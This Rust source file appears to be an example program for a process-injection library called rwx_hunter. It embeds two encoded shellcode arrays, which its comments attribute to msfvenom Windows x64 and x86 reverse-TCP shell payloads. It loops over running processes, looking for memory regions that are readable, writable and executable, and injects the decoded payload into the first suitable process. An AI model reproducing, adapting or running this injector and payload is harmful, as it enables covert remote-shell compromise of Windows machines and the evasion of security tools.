use std::error::Error;

use rwx_hunter::{RWXhunter, API};

fn main() -> Result<(), Box<dyn Error>> {
    // msfvenom -p windows/x64/shell_reverse_tcp -a x64 -f num LHOST=<IP> LPORT=<PORT>
    let shellcode_x64: Vec<u8> = vec![
        0xf0, 0x4b, 0x79, 0xec, 0xf3, 0xe4, 0xc3, 0xfa, 0x08, 0x03, 0x4d, 0x52, 0xbb, 0x58, 0x51,
        0x5d, 0x55, 0xb2, 0x39, 0xd1, 0x69, 0x4b, 0x71, 0x5a, 0x63, 0x44, 0x88, 0xa8, 0x10, 0x4b,
        0x87, 0x51, 0xda, 0x40, 0x88, 0x7e, 0x53, 0xb2, 0x07, 0xb4, 0x46, 0x49, 0xb7, 0x39, 0xca,
        0x44, 0x32, 0x3a, 0xa4, 0x3f, 0x6d, 0x7f, 0xf8, 0x24, 0x23, 0x4d, 0xc2, 0x33, 0x05, 0x42,
        0x0d, 0xc2, 0x18, 0xe5, 0x51, 0x4d, 0x52, 0xb2, 0x83, 0x51, 0x2c, 0x88, 0xb8, 0x34, 0x4b,
        0x0d, 0xd3, 0x71, 0x88, 0x8b, 0x0c, 0x03, 0xfa, 0x40, 0x86, 0xcc, 0x77, 0x9d, 0x40, 0x02,
        0xdc, 0x53, 0x71, 0x40, 0x1b, 0x48, 0x88, 0xba, 0x28, 0x4a, 0x0d, 0xd3, 0x19, 0x5e, 0x4b,
        0xf3, 0xca, 0xbb, 0x83, 0x37, 0x84, 0x4b, 0xfb, 0xde, 0x4e, 0x3d, 0xca, 0xb2, 0x39, 0xc3,
        0xa0, 0x42, 0x3b, 0xc1, 0x0e, 0x4d, 0x02, 0x3b, 0x30, 0xe3, 0x79, 0xf2, 0xb6, 0x0b, 0x4f,
        0x28, 0x0b, 0xbf, 0x31, 0xd2, 0x79, 0xdb, 0xa2, 0x4c, 0x88, 0x4c, 0x27, 0xb3, 0x09, 0xd3,
        0x6a, 0x42, 0x71, 0x04, 0x4b, 0x48, 0x88, 0xba, 0x14, 0x4a, 0x0d, 0xd3, 0xbb, 0x83, 0x07,
        0x84, 0x4b, 0xfb, 0xd8, 0x42, 0x54, 0x42, 0xa2, 0x56, 0x5a, 0x56, 0x42, 0xa2, 0x49, 0x5a,
        0x4d, 0x59, 0xb2, 0x8b, 0xef, 0x2c, 0x42, 0xa8, 0xf7, 0xe3, 0x54, 0x42, 0xa3, 0x52, 0x4b,
        0x87, 0x11, 0x13, 0x5f, 0xfc, 0xf3, 0xfc, 0xa7, 0x41, 0xbd, 0x7b, 0x70, 0xc8, 0x57, 0x30,
        0x3e, 0x03, 0xfa, 0x49, 0x55, 0x45, 0x8a, 0x1c, 0x40, 0x82, 0xe0, 0xa3, 0xfb, 0x08, 0x03,
        0x45, 0x8a, 0x1f, 0x41, 0xbf, 0x0e, 0x03, 0xfb, 0xb3, 0xaf, 0x15, 0xc5, 0x9b, 0x49, 0x57,
        0x45, 0x8a, 0x1e, 0x44, 0x8a, 0xfd, 0x42, 0x40, 0x44, 0x74, 0x2a, 0x04, 0x05, 0xdd, 0x4f,
        0x85, 0xe9, 0x92, 0x09, 0x02, 0x0c, 0x03, 0xa3, 0x49, 0xb9, 0x25, 0x83, 0x91, 0x08, 0xfc,
        0xd9, 0x53, 0xaa, 0x45, 0x32, 0xc5, 0x4e, 0xcb, 0xc8, 0x4b, 0xf3, 0xc3, 0xb2, 0x81, 0xc1,
        0x44, 0xfc, 0x3a, 0x40, 0x8a, 0xcd, 0x42, 0x40, 0xe2, 0x0c, 0xd3, 0xe3, 0x05, 0xdd, 0x4b,
        0x85, 0xc4, 0x90, 0x18, 0x42, 0x54, 0x4f, 0x73, 0xea, 0x4b, 0x85, 0xfa, 0xbb, 0xb2, 0x9a,
        0xa9, 0x77, 0x9b, 0xf7, 0xd6, 0x44, 0x82, 0x3e, 0x48, 0x01, 0x0c, 0x03, 0xb3, 0xb0, 0x60,
        0x61, 0x67, 0xfa, 0x08, 0x03, 0x0c, 0x03, 0xbb, 0x58, 0x42, 0x5c, 0x4b, 0x73, 0xea, 0x54,
        0x5b, 0x54, 0xb7, 0x39, 0xc3, 0x66, 0x0e, 0xa3, 0x49, 0x53, 0xee, 0xff, 0x9c, 0xcf, 0x47,
        0x28, 0x57, 0xfb, 0x09, 0x4b, 0x81, 0x47, 0xde, 0x10, 0xc5, 0x0c, 0x6b, 0xb2, 0x81, 0xe5,
        0x5a, 0x53, 0xbb, 0x58, 0x42, 0x5c, 0x42, 0xaa, 0x41, 0xfc, 0xcc, 0x42, 0xaa, 0x41, 0xfc,
        0xc4, 0x4e, 0x73, 0xc9, 0x4f, 0x85, 0xc2, 0xbb, 0xb2, 0x7a, 0xc0, 0x3c, 0x7c, 0xf7, 0xd6,
        0x44, 0x32, 0x28, 0x40, 0xfc, 0xc6, 0x88, 0xf4, 0x49, 0xb9, 0x04, 0x84, 0xe7, 0x68, 0xfc,
        0xd9, 0xb8, 0x0a, 0xbd, 0xa1, 0x5a, 0x42, 0x40, 0xae, 0x96, 0xb1, 0x9e, 0x05, 0xdd, 0x4b,
        0x8f, 0xc7, 0xd2, 0x34, 0x05, 0x70, 0x09, 0x7a, 0xf3, 0xe3, 0x79, 0x06, 0x41, 0x4f, 0x10,
        0x7e, 0x6c, 0x90, 0x08, 0x5a, 0x4d, 0x8a, 0x20, 0xf7, 0xd6,
    ];

    // msfvenom -p windows/shell_reverse_tcp -a x86 -f num LHOST=<IP> LPORT=<PORT>
    let shellcode_x86: Vec<u8> = vec![
        0xf0, 0xeb, 0x78, 0x08, 0x03, 0x0c, 0x63, 0x73, 0xed, 0x32, 0xcc, 0x67, 0x71, 0x58, 0x33,
        0x87, 0x51, 0xf6, 0x83, 0x51, 0x18, 0x88, 0x88, 0x20, 0x0c, 0xbb, 0x49, 0xdc, 0x39, 0xfc,
        0xa0, 0x3f, 0x9b, 0x74, 0x01, 0x20, 0x23, 0x3b, 0xc7, 0x0e, 0x0d, 0xc4, 0x18, 0xfa, 0x51,
        0x5b, 0x88, 0xa8, 0x18, 0x88, 0x46, 0x3f, 0x71, 0x44, 0x12, 0x74, 0xe0, 0xb2, 0x09, 0xd2,
        0x5d, 0x88, 0xa3, 0x28, 0x02, 0xdf, 0x88, 0xb3, 0x10, 0xe0, 0x36, 0x4a, 0x71, 0x3c, 0x88,
        0x0d, 0xd5, 0xcb, 0xf7, 0xaf, 0xcd, 0xcc, 0xf7, 0x09, 0xc4, 0x34, 0xe3, 0x8f, 0xfe, 0x00,
        0x71, 0xfb, 0xc1, 0x75, 0x27, 0x79, 0xe7, 0xa2, 0x83, 0x5b, 0x28, 0x02, 0x29, 0x6e, 0x88,
        0x00, 0x48, 0x71, 0x50, 0x1f, 0x0d, 0xd0, 0x71, 0x0c, 0x88, 0x0d, 0xd3, 0x73, 0x4c, 0x27,
        0x28, 0x58, 0xa1, 0x69, 0x5a, 0x56, 0x52, 0x05, 0xe8, 0x5c, 0x53, 0x59, 0x71, 0x1a, 0xe8,
        0x81, 0x5e, 0x92, 0x3b, 0x31, 0x0c, 0x03, 0x92, 0x7f, 0x70, 0x3e, 0x5c, 0xae, 0x60, 0x4f,
        0x7b, 0x25, 0xfd, 0xf7, 0xd6, 0xb4, 0x93, 0xfb, 0x08, 0x03, 0x25, 0xc7, 0xae, 0x58, 0x6b,
        0x25, 0x83, 0x91, 0x08, 0xfc, 0xd9, 0x53, 0xaa, 0x58, 0x53, 0x4c, 0x53, 0xba, 0x58, 0x6b,
        0xe6, 0x0c, 0x25, 0xe8, 0xfc, 0xd9, 0x94, 0x90, 0x0d, 0x6b, 0xa0, 0x1a, 0x3c, 0x69, 0x6b,
        0x0e, 0x03, 0xfb, 0xb3, 0x8a, 0xea, 0x69, 0xea, 0x5e, 0x54, 0x64, 0x9a, 0x5f, 0x7c, 0x62,
        0xf3, 0xd6, 0x7f, 0xc8, 0x77, 0x00, 0xfc, 0xb4, 0x00, 0x76, 0xe0, 0x6b, 0x0a, 0xbd, 0xa1,
        0x5a, 0xfc, 0x2f, 0x60, 0x60, 0x61, 0x67, 0xfa, 0x81, 0xe0, 0x5b, 0x54, 0xad, 0x39, 0xf5,
        0x66, 0x11, 0xa3, 0x5e, 0xe1, 0xf1, 0x65, 0x3d, 0x4c, 0x27, 0x30, 0x02, 0xfb, 0x85, 0x47,
        0x28, 0x13, 0x3c, 0x08, 0x47, 0x58, 0x53, 0xac, 0x5e, 0x55, 0x4a, 0x55, 0xb4, 0x5e, 0x55,
        0x5f, 0x55, 0x92, 0x71, 0xcf, 0x33, 0x85, 0x05, 0xdd, 0x8a, 0xec, 0x4d, 0xac, 0x4e, 0xfc,
        0x3c, 0x6b, 0xf2, 0x8f, 0x1e, 0x6c, 0xfc, 0x2f, 0xb3, 0xf3, 0xb9, 0xa1, 0xac, 0x60, 0xa5,
        0x99, 0xbe, 0x67, 0xf7, 0xd6, 0x30, 0x05, 0x86, 0x02, 0x83, 0xf7, 0xe3, 0x8f, 0x0d, 0xb8,
        0x4b, 0x10, 0x88, 0x67, 0x69, 0x0c, 0x50, 0x05, 0xdd,
    ];

    let mut hunter = RWXhunter::new(
        shellcode_x64,
        shellcode_x86,
        vec![12, 3, 250, 8, 3].into(),
        API::Native,
    );
    while hunter.find_next_candidate().is_ok() {
        if hunter.inject().is_ok() {
            return Ok(());
        }
    }
    Err(Box::from("Could not find a suitable injection candidate."))
}
